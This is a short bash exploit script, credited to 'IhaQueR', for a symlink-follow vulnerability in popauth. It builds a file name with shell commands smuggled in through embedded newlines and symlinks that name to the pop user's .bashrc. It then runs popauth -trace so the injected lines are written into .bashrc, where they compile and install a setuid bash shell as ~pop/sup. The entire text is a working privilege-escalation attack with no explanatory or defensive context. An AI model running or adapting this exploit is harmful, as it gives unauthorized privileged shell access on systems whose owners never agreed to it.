#!/bin/bash

# popauth symlink follow vuln by IhaQueR
# this will create .bashrc for user pop
# and ~pop/sup suid shell

FILE=$(perl -e 'print "/tmp/blah1\"\ncd ~\necho >blah.c \"#include <stdio.h>\nmain(){setreuid(geteuid(),getuid());execlp(\\\"bash\\\", \\\"bash\\\",NULL);}\"\ngcc blah.c -o sup\nchmod u+s sup\necho done\n\n\""')

ln -s /var/lib/pop/.bashrc "$FILE"

/usr/sbin/popauth -trace "$FILE"
